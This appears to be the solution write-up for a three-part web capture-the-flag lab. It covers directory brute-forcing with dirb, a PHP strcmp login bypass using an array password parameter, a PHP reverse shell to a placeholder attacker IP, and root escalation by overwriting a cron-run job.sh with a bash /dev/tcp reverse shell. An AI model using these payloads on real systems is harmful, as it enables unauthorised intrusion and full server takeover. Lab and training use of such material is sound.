## Solution
### Challenge 1
Use a Web Content Scanner to perform a dictionary-based attack against a web server.
```sh
dirb http://127.0.0.1 /usr/share/wordlists/dirb/common.txt
```

### Challenge 2
Use [PHP Strcmp](https://www.php.net/manual/en/function.strcmp.php) bypass.
This can be done by using the `?password[]=%22%22`.
Due to some inherent weaknesses in PHP's comparisons, NULL == 0 will return true.

```sh
 curl -X POST --data "username=admin&password[]=%22%22&submit=Login" http://127.0.0.1/admin/index.php
```

### Challenge 3
Use Reverse Shell to gain a foothold in the system.
Using a tool like `netcat` to host the reverse shell.
```sh
php -r '$sock=fsockopen("<attacker_ip>",<attacker_port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Once access to the server, the user should be `www-data` by Apache default.
Observe the ongoing processors in the contianers. The file `/worker.sh` is executing a job as root every 5th second.
The file `/home/job.sh` has write privileges.
Inject or overwrite a reverser shell command to the job.sh file of bash to call a new instance of netcat:
```sh
echo "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" > /home/job.sh
```
